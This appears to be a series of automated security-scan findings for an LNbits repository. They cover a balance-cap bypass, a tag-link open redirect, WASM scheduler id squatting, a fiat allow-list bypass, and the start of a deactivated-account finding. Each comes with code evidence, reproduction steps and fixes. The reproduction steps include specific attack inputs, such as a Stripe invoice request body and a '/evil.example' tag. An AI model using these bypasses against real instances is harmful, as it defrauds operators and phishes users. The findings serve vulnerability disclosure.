`balance_msat` comes from the `balances` view, which sums incoming rows only when `status = 'success'` (core/migrations.py:945-957), so invoices that are already outstanding (pending) contribute nothing to the checked value. Nothing limits how many pending invoices a wallet may have, and no check is repeated when an invoice is actually paid: `_pay_internal_invoice` (:856-860) sets the receiver's row to SUCCESS unconditionally, and `update_payment_success_status` (:1038-1066) and `update_invoice_from_paid_invoices_stream` (:1309-1334) settle externally paid invoices the same way.

Bypass: with cap L and settled balance 0, an invoice-key holder creates N invoices of L-1 sats each via POST /api/v1/payments (each check sees 0 + L-1, passes), then has them all paid - internally from another wallet, over Lightning, or through LNURL/lightning-address callbacks that also run create_invoice. The wallet ends at N*(L-1), arbitrarily above the operator's cap. No concurrency is needed: the check (creation) and the act (settlement credit) are separated in time and the checked state (settled balance) changes between them as other invoices settle.

The project treats this cap as binding, not advisory: sequential create-pay-create is refused; `update_wallet_balance` (:582-586) re-checks it on admin top-ups and the project's own test asserts that refusal (tests/unit/test_services_payments.py:473-477); the admin panel describes it as 'Global balance, withdrawal, and transaction limits for every wallet' with the only caveat being that limits 'can prevent outgoing payments' (en.js:510-513). This distinguishes it from the rejected fiat-faucet cap, whose UI text explicitly disclosed that parallel payments could drive the faucet negative. It is the receive-side counterpart of the verified `wallet-spend-limits-toctou-concurrent-payments`.

## Evidence
1. [lnbits/core/services/payments.py:345–352](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L345-L352)
   create_invoice is the only place lnbits_wallet_limit_max_balance is enforced for incoming funds: it compares the wallet's current settled balance plus this one invoice's amount. Other pending invoices on the same wallet are not counted, and nothing re-checks when an invoice is paid. This is the code the fix must change.
2. [lnbits/core/migrations.py:945–957](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L945-L957)
   The balances view backing Wallet.balance_msat sums incoming apipayments rows only when status = 'success'; pending incoming invoices are invisible to the cap check, so N outstanding invoices each pass against the same unchanged balance.
3. [lnbits/core/services/payments.py:856–861](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L856-L861)
   _pay_internal_invoice flips the receiving row to SUCCESS (crediting the receiver) with no balance-cap check on the receiving wallet.
4. [lnbits/core/services/payments.py:1038–1066](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1038-L1066)
   update_payment_success_status (external settlement via status check / webhook) marks incoming payments SUCCESS without consulting the cap; update_invoice_from_paid_invoices_stream (lines 1309-1334) does the same for the funding-source paid stream.
5. [lnbits/core/views/payment\_api.py:280–328](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L328)
   Any invoice-key holder creates invoices through POST /api/v1/payments (out:false) -> create_payment_request -> create_invoice; the cap check sees the same unchanged settled balance for each of N invoices created before any is paid, and no pending-count limit exists on this path.
6. [lnbits/settings.py:480–482](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L480-L482)
   lnbits_wallet_limit_max_balance is an operator SecuritySettings field alongside the daily-withdraw and spacing limits.
7. [lnbits/settings.py:492–497](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L492-L497)
   is_wallet_max_balance_exceeded is a pure comparison on the amount passed in; the caller decides what to include, and create_invoice includes only settled balance + the single new invoice.
8. [lnbits/core/services/payments.py:582–586](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L582-L586)
   update_wallet_balance re-checks the same cap on admin top-ups and raises if it would be exceeded, showing the project intends the cap as a hard ceiling on what a wallet may hold rather than an advisory figure.
9. [lnbits/static/i18n/en.js:510–519](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/i18n/en.js#L510-L519)
   Admin UI presents it as 'Maximum wallet balance' under 'Global balance, withdrawal, and transaction limits for every wallet'; the only warning is that limits 'can prevent outgoing payments'. No caveat that the balance cap is advisory, unlike the fiat faucet text that explicitly warns about parallel payments.
10. [tests/unit/test\_services\_payments.py:473–477](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/unit/test_services_payments.py#L473-L477)
   The project's own test asserts that a credit pushing a wallet over lnbits_wallet_limit_max_balance is refused with 'amount exceeds maximum balance', establishing the intended contract that the invoice-settlement path does not honour.

## Impact
The operator's per-wallet balance ceiling - a custodial exposure control the project enforces as a hard refusal elsewhere - can be exceeded without bound by any user. Every credited sat is backed by an inbound payment, no other user's funds are touched and nothing is disclosed, so the impact is a policy-control bypass: integrity LOW.

## Reproduction steps
1. Attacker: any self-registered user (or anyone holding a wallet's invoice key) on an instance where the operator has set lnbits_wallet_limit_max_balance > 0 (AT:PRESENT). They issue several POST /api/v1/payments invoice requests each under the cap - all pass because pending invoices are not in the settled balance - then have them paid internally, over Lightning, or via their lightning address. No race timing, no victim interaction, no defence to evade.

## Recommended fix
The maximum-balance limit is evaluated once at invoice creation against the settled balance (which excludes pending incoming invoices), and is never re-evaluated when an invoice is settled, so outstanding invoices created under the cap can collectively push the wallet above it. Fix criteria: A wallet subject to lnbits_wallet_limit_max_balance must not be able to end above the cap through any sequence of invoice creations and settlements: count pending incoming invoices toward the cap at creation (or reserve the amount), and/or re-check the cap at settlement and refuse or hold the credit when it would be exceeded. Verify: create several invoices each under the cap whose sum exceeds it, pay them all, and confirm the wallet balance does not exceed the configured limit.

---
**Severity:** LOW
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257548

---

# Invoice-key holder controls payment tag link destination in owner's wallet (protocol-relative URL)

## Details
The shared payment list (lnbits-payment-list, mounted in /wallet and in the admin /users page) renders every tagged payment with a badge link whose destination is built from the payment's tag: `:href="['/', props.row.tag].join('')"` (lnbits-payment-list.vue:309). The tag is `payment.extra.tag`, and `extra` is a free-form dict chosen by whoever created the payment.

Source: `POST /api/v1/payments` is guarded only by `require_base_invoice_key`; for `out=false` the caller's `CreateInvoice.extra` flows unchanged through `create_payment_request` -> `create_wallet_invoice(extra=data.extra)` -> `create_invoice` -> `calculate_fiat_amounts` (adds keys only) -> `CreatePayment(extra=extra)` -> `create_payment`, which persists `tag=extra.get('tag')` and the dict. Neither the server (no allow-list, no normalisation; `Connection.insert` does not run `rewrite_values`) nor the client (mapPayment copies `extra` and `tag` verbatim) restricts the value.

Sink: the intention is a same-origin link to the extension page `/<tag>`. Because the template only prefixes a single `/`, a tag beginning with `/` (or `\`, which the WHATWG URL parser treats as `/` for special schemes) produces a protocol-relative URL: tag `/evil.example/login` renders `<a href="//evil.example/login">#/evil.example/login</a>`. Vue 3 does not sanitise `:href`. Clicking the yellow tag badge navigates the owner's top-level window (no target=_blank, no rel) to the attacker's host. `javascript:` cannot be reached because of the forced leading slash, so the impact is link hijacking / phishing from a trusted UI element rather than script execution.

Attackers and victims: (1) any invoice-key holder (receive-only key embedded in PoS devices, public pay pages and shared-wallet grants) plants the link in the wallet owner's list; the pending invoice shows the memo and amount of the attacker's choosing beside the badge. (2) Any ordinary user tagging payments in their own wallet plants it for an admin who opens that wallet's payments on the /users page (users.vue:16), i.e. an unprivileged user -> admin lure. The destination can be a look-alike LNbits login or an 'invoice expired, re-authenticate' page; the user arrives from a click inside their authenticated wallet.

This is a different sink from the recorded invoice-key-fiat-payment-request-javascript-href-qrcode-xss (lnbits-qrcode href, same list) and is reachable without opening the details dialog.

## Evidence
1. [lnbits/templates/components/lnbits-payment-list.vue:300–311](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components/lnbits-payment-list.vue#L300-L311)
   For every payment with a tag the list renders a yellow badge whose anchor is bound as :href="['/', props.row.tag].join('')" with no validation; a tag of '/evil.example' or '\\evil.example' yields the protocol-relative href '//evil.example', which the browser resolves to an external origin when the owner clicks the badge.
2. [lnbits/static/js/components/lnbits-payment-list.js:170–184](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-payment-list.js#L170-L184)
   mapPayment copies extra verbatim (extra: data.extra ?? {}) and sets obj.tag = obj.extra?.tag, so the creator-supplied value reaches the template.
3. [lnbits/core/views/payment\_api.py:280–329](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L329)
   POST /api/v1/payments accepts the wallet invoice key (require_base_invoice_key) and for out=false passes the whole CreateInvoice, including the free-form extra dict, to create_payment_request.
4. [lnbits/core/models/payments.py:289–304](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L289-L304)
   CreateInvoice.extra is `dict | None` with no key allow-list; tag is not reserved.
5. [lnbits/core/crud/payments.py:260–281](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L260-L281)
   create_payment stores tag=extra.get('tag') and the full extra dict without normalising the tag; Connection.insert does not apply rewrite_values, so the string is persisted and returned verbatim by the paginated payments API.
6. [lnbits/templates/pages/users.vue:14–17](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/users.vue#L14-L17)
   The admin Users page mounts the same lnbits-payment-list for any user's wallet, so an ordinary user who tags payments in their own wallet also plants the link in an admin's session.

## Impact
The attacker controls where a trusted link inside the wallet UI leads, enabling credential phishing against the wallet owner or an admin. No script runs on the LNbits origin and no data is read or changed directly, so impact on the vulnerable system is limited to integrity of the UI (misleading navigation).

## Reproduction steps
1. Attacker with a wallet's invoice key (or any user, for the admin-victim variant) calls POST /api/v1/payments with out=false and extra.tag='/attacker.example/path'. The dict passes create_payment_request -> create_wallet_invoice -> create_invoice -> calculate_fiat_amounts (adds keys only) -> create_payment, which stores tag=extra.get('tag') and extra with db.insert; no validator on CreateInvoice or Payment touches extra or tag, and Connection.fetchall/fetchone apply rewrite_values only to query parameters, never to returned rows, so GET /api/v1/payments/paginated (owner, inkey) and /api/v1/payments/all/paginated?wallet_id= (admin fallback in fetchPaymentsAsAdmin) return it verbatim. mapPayment sets obj.tag = obj.extra?.tag and the badge binds :href="['/', props.row.tag].join('')", yielding the protocol-relative '//attacker.example/path'; one click navigates the authenticated session's top-level window to the attacker's host. Assumption: Vue 3.5.44 (package.json) binds :href verbatim without URL-scheme or origin sanitisation, as Vue's security guide documents. No defence stands in the way and no special deployment is needed.

## Recommended fix
1. The tag badge builds an href by string concatenation from a creator-controlled value, so values starting with '/' or '\\' escape the intended same-origin path and become protocol-relative external URLs. Fix criteria: The rendered link must always resolve to a same-origin path (e.g. only when the tag matches the installed extension-id pattern [a-z0-9_]+, otherwise render plain text or encodeURIComponent the segment). Verify that a payment with extra.tag '/evil.example' renders a badge whose anchor resolves to the LNbits origin or has no href.
2. The payments API stores caller-supplied extra.tag verbatim although the UI and server treat tag as a trusted extension identifier. Fix criteria: Tags supplied through the public payments API must be validated against the identifier character set (or restricted to installed extension ids) before persistence. Verify POST /api/v1/payments with extra.tag containing '/' or '\\' is rejected or the tag is dropped.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257547

---

# WASM user-scope jobs choose ids in the global scheduled_jobs key space, pre-empting and probing other namespaces' deterministic ids

## Details
`scheduled_jobs.id` is one global primary key shared by core, Python extensions and WASM extensions for both shared and per-user jobs. `save_scheduled_job` (lnbits/core/crud/scheduler.py:13-41) enforces ownership with `INSERT ... ON CONFLICT (id) DO UPDATE ... WHERE namespace/handler/user_id match` and raises `PermissionError("Schedule ID is already in use by another owner or handler.")` when the row belongs to someone else. That blocks takeover but makes the first writer the permanent holder of an id, and the distinct error is an existence oracle.

The id is caller-chosen. The WASM host method `scheduler.set` (lnbits/core/wasm_ext/api/scheduler.py:85-106) forwards the guest-supplied `id` for user-scope jobs; the only reservation is the 64-lowercase-hex form used by the host-derived shared-job ids (`sha256s(json.dumps([ext_id, None, handler]))`, lnbits/core/wasm_ext/wasm/scheduler.py:29), so core's own auto-created WASM shared jobs are protected. `Scheduler.save` (services/scheduler.py:149-178) and `ScheduleConfig` (models/scheduler.py:68-71) add no namespace or owner binding, so a user job in `extension:A` may carry any id matching `^[A-Za-z0-9_.:-]{1,128}$` that is not 64 hex characters.

Attacker: the author of a WASM extension installed with the `scheduler.user` grant (an in-scope sandboxed adversary), triggering during any authenticated user's request to the extension - the author can register as an ordinary user and trigger it themselves. Consequences, which hold against any installed Python extension that saves jobs under the deterministic ids docs/devs/scheduler.md:172-189 recommends (core itself saves no jobs in this checkout; the victims are extension repos following the docs):

1. Cross-namespace squatting. The guest creates up to `max_jobs_per_user` (default 10) jobs per approved handler with ids equal to a target Python extension's fixed shared-job id (e.g. `myextension:cleanup`) or its per-user id `myextension:<sha256s(user_id)>:refresh`. The per-user form needs the victim's user id; the host does not hand the guest its user's id (wallet.list_user_wallets returns id/name/currency only, public storage rows are filtered to `public_fields`), but the extension's own front-end runs in the shared LNbits browser origin where the logged-in user's id is embedded in the page and can be posted to the guest, so the extension can squat ids for its own users. The target extension's later `scheduler.save(...)` for that id fails with PermissionError permanently: the admin API (views/scheduler_api.py) is read-only, so recovery requires the admin to identify the squatting namespace on the Scheduler page and deactivate or uninstall that extension.

2. Existence oracle. `scheduler.set` with a candidate id returns success (the probe job can then be deleted) or the distinct 'already in use by another owner' error, revealing whether any other namespace/user holds that id - for deterministic schemes, whether a given user has enabled a given feature in another extension.

The `scheduler.user` grant is documented as 'Manage jobs belonging to the authenticated user' (docs/wasm-extensions.md:270,396); blocking another extension's scheduling or learning its job ids is outside that grant and crosses the process<->WASM-extension permission boundary. The maintainers recognised the collision risk for their own shared-job hashes (reservation at api/scheduler.py:98-100) but left every other deterministic form open; `tests/unit/test_scheduler.py::test_persistence_and_scope_isolation` tests only that cross-owner saves raise, not that a user-scope id cannot pre-empt another namespace's id.

## Evidence
1. [lnbits/core/wasm\_ext/api/scheduler.py:85–106](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/api/scheduler.py#L85-L106)
   Host method scheduler.set: for user scope (owner set) the guest-supplied request.id is forwarded unchanged into scheduler.save; the only reservation is the 64-lowercase-hex form (line 98-100, comment 'IDs are global: reserve shared hashes across all handlers/extensions'). Any other id another namespace will later need - including the 'myextension:<sha256>:handler' and fixed-name forms the docs recommend to Python extensions - is accepted. This is the untrusted boundary the fix must change.
2. [lnbits/core/crud/scheduler.py:13–41](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/scheduler.py#L13-L41)
   save_scheduled_job upserts on the single global primary key id; when the row belongs to another namespace/handler/owner the WHERE clause updates zero rows and a distinct PermissionError('Schedule ID is already in use by another owner or handler.') is raised. Takeover is prevented, but the first writer holds the id, and the distinct error (versus success) is an existence oracle for ids owned by others.
3. [lnbits/core/services/scheduler.py:149–178](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/scheduler.py#L149-L178)
   Scheduler.save passes config.id through unchanged; no prefix, derivation or (namespace,user) scoping binds a user-scope id to its owner. The max_jobs_per_user check (default 10 per handler) only bounds how many ids one user can hold per handler.
4. [lnbits/core/models/scheduler.py:68–71](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/scheduler.py#L68-L71)
   ScheduleConfig.id is caller-chosen, constrained only by ^[A-Za-z0-9_.:-]{1,128}$.
5. [lnbits/core/views/scheduler\_api.py:18–59](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/scheduler_api.py#L18-L59)
   The admin scheduler API is read-only (list jobs, sources, runs); there is no admin delete, so a squatting row can only be removed by its owner or by uninstalling/deactivating the squatting extension (delete_namespace_schedules).
6. [docs/devs/scheduler.md:172–189](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/devs/scheduler.md#L172-L189)
   Project documentation tells trusted Python extensions to use deterministic ids ('myextension:' + sha256s(user_id) + ':refresh', or a stable namespaced name) in the same global key space, making the ids a WASM guest must supply predictable.

## Impact
Availability Low: a targeted extension's scheduled feature (instance-wide for a fixed shared id, per user for a hashed-user id) is blocked until an admin identifies and deactivates/uninstalls the squatting extension; no admin delete exists. Confidentiality Low: the distinct PermissionError reveals whether a specific id is held by another namespace/user, i.e. one bit of another extension's or user's configuration per probe; it requires knowing the exact id. Integrity None: foreign rows cannot be read, updated or deleted (ON CONFLICT WHERE, owner-filtered list/delete).

## Reproduction steps
1. Attacker position: author of a WASM extension that an admin has installed with the scheduler.user grant (sandboxed extension code is an in-scope adversary; the grant and a victim Python extension using documented deterministic ids are attack requirements). Trigger: during an authenticated request to the extension (the author can register as an ordinary user, registration being open by default), guest code calls scheduler.set with id equal to the target's fixed shared id, or its per-user id using a user id the extension's own front-end read from the shared browser origin. The save succeeds (host only rejects 64-hex ids) and the row is owned by extension:attacker forever; the same call doubles as an existence probe. Core's auto-created WASM shared jobs are protected by the 64-hex reservation; core saves no other jobs in this checkout, so impact depends on third-party Python extensions following docs/devs/scheduler.md.

## Recommended fix
User-scope schedule ids chosen by sandboxed WASM callers share one global primary key with every other namespace and owner, so the ownership check that prevents takeover also lets the first writer pre-empt ids another namespace will need and reveals, via a distinct error, that a foreign id exists. Fix criteria: A job id written on behalf of one namespace/owner cannot block or reveal ids of another: the host derives or prefixes the stored key for WASM user-scope jobs from (extension id, user, caller-supplied id) so the guest cannot produce a key equal to one any other namespace saves, and/or uniqueness is scoped to (namespace, user_id). After the fix, a save against a key held by another namespace/owner is indistinguishable from a fresh create for the caller, and existing callers' update-by-id semantics are preserved.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper isolation
**CWE:** [CWE-653](https://cwe.mitre.org/data/definitions/653.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257545

---

# Fiat-provider allowed_users list enforced only for FIAT wallets; any lightning wallet creates Stripe/PayPal invoices

## Details
Operators who connect a fiat provider (Stripe, PayPal, Square, Revolut) can restrict it with `<provider>_limits.allowed_users` (admin UI: 'Only these users can use Stripe'; code comment: 'empty list means all users are allowed to receive payments via Stripe'). When a user is allowed, the wallet UI lets them receive provider payments into ANY of their wallets, including ordinary lightning wallets (wallet.vue:477-526 shows the provider options next to 'Pay with Lightning Network'); on confirmation the user's wallet is credited the sat amount fixed at invoice creation and the operator's faucet wallet is debited (fiat_providers.py:306-345).

The server-side check that implements the allow-list, however, only runs for FIAT-type wallets:

```python
wallet = await get_wallet(wallet_id, conn=conn)
if (wallet and wallet.wallet_type == WalletType.FIAT.value
        and fiat_provider_name not in settings.get_fiat_providers_for_user(wallet.user)):
    raise ValueError("Fiat provider is not available for this user.")
```
(services/payments.py:174-180). For a lightning wallet the condition is false and the request proceeds to `_check_fiat_invoice_limits`, `create_wallet_invoice(internal=True)` and `fiat_provider.create_invoice(...)`, creating a real checkout session/order on the operator's provider account.

Attack: any self-registered user (registration is open by default) who is NOT in `stripe_limits.allowed_users` sends `POST /api/v1/payments` with their lightning wallet's invoice key and body `{"out": false, "amount": 100, "unit": "USD", "fiat_provider": "stripe", "extra": {"fiat_method": "checkout"}}`. They receive a Stripe checkout URL, pay it with a card, and the Stripe webhook (callback_api.py -> check_fiat_status) marks the invoice SUCCESS: their lightning wallet now holds sats taken from the operator's faucet wallet (or unbacked if no faucet is configured), which they can immediately spend or withdraw over Lightning. The operator's stated control over who may convert card payments into sats on their instance (the usual reason for an allow-list: chargeback/fraud exposure, KYC, limiting the sale of sats to known users) is bypassed. The UI hides the option from non-allowed users, which is why the gap is not visible in normal use; the maintainers' only allow-list test covers a FIAT wallet.

Related records: `fiat-faucet-balance-cap-only-checked-at-creation` (rejected) concerns the faucet balance cap, not this authorization check; `revolut-subscription-payment-bypasses-fiat-limits` concerns the webhook-driven subscription path. This finding is the direct invoice-creation path at payments.py:174-180.

## Evidence
1. [lnbits/core/services/payments.py:174–180](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L174-L180)
   create_fiat_invoice consults the per-user provider allow-list (settings.get_fiat_providers_for_user) only when `wallet.wallet_type == WalletType.FIAT.value`. For an ordinary LIGHTNING wallet the condition is false and the request proceeds to _check_fiat_invoice_limits, create_wallet_invoice(internal=True) and fiat_provider.create_invoice; the only remaining gate is the instance-wide is_fiat_provider_enabled. This is the line the fix must change.
2. [lnbits/core/views/payment\_api.py:280–328](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L328)
   POST /api/v1/payments authenticates with any wallet invoice key (require_base_invoice_key); for `out: false` it calls create_payment_request(wallet_id, invoice_data), which dispatches to create_fiat_invoice whenever the client-supplied `fiat_provider` field is set. No wallet-type or allow-list check happens here.
3. [lnbits/settings.py:855–884](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L855-L884)
   get_fiat_providers_for_user is the per-user authorization decision (provider enabled AND (allow-list empty OR user in allow-list)). It is what the FIAT-wallet branch consults and what the lightning-wallet path skips.
4. [lnbits/settings.py:717–719](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L717-L719)
   FiatProviderLimits.allowed_users is documented in code as 'empty list means all users are allowed to receive payments via Stripe' - the list is meant to restrict who may receive provider payments at all, not only who may own a FIAT-type wallet.
5. [lnbits/static/i18n/en.js:1016](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/i18n/en.js#L1016)
   Admin UI hint rendered beside each provider's allowed-users list (admin/fiat_providers.vue): 'Only these users can use {feature}' with feature = Stripe/PayPal/Square/Revolut. The operator is told the list restricts use of the provider.
6. [.env.example:386–388](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.env.example#L386-L388)
   Shipped operator documentation describes the allow-listed principals as 'Users allowed to use an enabled fiat provider', confirming the list is a per-user capability gate on provider use rather than a FIAT-wallet-only rule.
7. [lnbits/templates/pages/wallet.vue:477–525](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/wallet.vue#L477-L525)
   The wallet receive dialog offers 'Pay with Stripe/PayPal/Square/Revolut' for every wallet type, including lightning wallets ('Pay with Lightning Network' is shown alongside when !isFiatWallet), but only when g.user.fiat_providers contains the provider. Receiving provider payments into a lightning wallet is an intended feature for ALLOWED users and hidden from others; the server does not enforce what the UI hides.
8. [lnbits/core/models/users.py:198–204](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L198-L204)
   User.fiat_providers is populated from settings.get_fiat_providers_for_user(self.id): the allow-list is modelled as a per-user capability, not a per-wallet-type one.
9. [lnbits/core/views/callback\_api.py:143–164](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L143-L164)
   The Stripe checkout.session.completed webhook resolves the payment by payment_hash and calls check_fiat_status with no wallet-type or allow-list check, so the lightning-wallet invoice created above settles exactly like an allowed user's.
10. [lnbits/core/services/fiat\_providers.py:40–66](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/fiat_providers.py#L40-L66)
   check_fiat_status marks the pending internal invoice SUCCESS - crediting the receiving wallet with the sat amount fixed at creation - and runs handle_fiat_payment_confirmation (service-fee credit, faucet debit). No allow-list check occurs here either.
11. [lnbits/core/services/fiat\_providers.py:306–345](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/fiat_providers.py#L306-L345)
   _debit_fiat_service_faucet_wallet debits the operator's faucet wallet by the full sat amount for every confirmed provider payment: the sats credited to the non-allowed user's lightning wallet are the operator's (or unbacked ledger credits when no faucet is configured).
12. [lnbits/core/models/wallets.py:183–194](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L183-L194)
   FIAT wallets have only VIEW/RECEIVE permissions and cannot send, while lightning wallets have every permission. A non-allowed user therefore has no sanctioned route to spendable sats from a card payment: FIAT-wallet creation is refused to them (wallet_api.py:261) and the allow-list is enforced on FIAT wallets; only the lightning-wallet path hands them that capability.

## Impact
The operator's per-user authorization for the fiat-to-sats feature is bypassed: non-allowed users create checkouts on the operator's provider account and receive operator-funded sats (faucet debit) in a spendable lightning wallet, exposing the operator to card-payment reversal against irreversible Lightning withdrawals. Every sat credited is paid for in fiat at settlement time, so the ledger is not corrupted and no other user's funds are reachable: integrity LOW. No confidentiality or availability impact.

## Reproduction steps
1. Attacker is any registered user holding the invoice key of their own lightning wallet. One HTTP request to POST /api/v1/payments with fiat_provider set creates a provider checkout on the operator's account; the attacker then pays it with a card and the provider webhook settles it. No race, no victim interaction. Requires the operator to have enabled a fiat provider and configured allowed_users (otherwise there is no control to bypass), hence AT:PRESENT.

## Recommended fix
create_fiat_invoice applies the per-user provider allow-list (get_fiat_providers_for_user) only when the receiving wallet is FIAT-type, so lightning wallets of non-allowed users can create and settle provider invoices. Fix criteria: For every wallet type, creating a fiat-provider invoice must fail when the provider is not in get_fiat_providers_for_user(wallet.user) (for shared mirrors, evaluate the source wallet's owner). Verify: a user absent from stripe_limits.allowed_users posting fiat_provider=stripe with a lightning wallet key receives an error and no provider API call or apipayments row is made; an allowed user still succeeds.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257544

---

# Shared-wallet grantee keeps spending a deactivated owner's wallet; activation checked only for the key's own account

## Details
Admin deactivation (`PUT /users/api/v1/user/{id}/activate`) is the operator's mechanism for freezing an account. The project treats it as freezing the account's wallets, not just its sessions: `get_wallet_for_key`/`get_base_wallet_for_key` require `accounts.activated = true`, and tests/api/test_users.py:698-756 asserts that right after deactivation the user's own admin key can no longer pay out (`POST /api/v1/payments` -> 404 'Wallet not found').

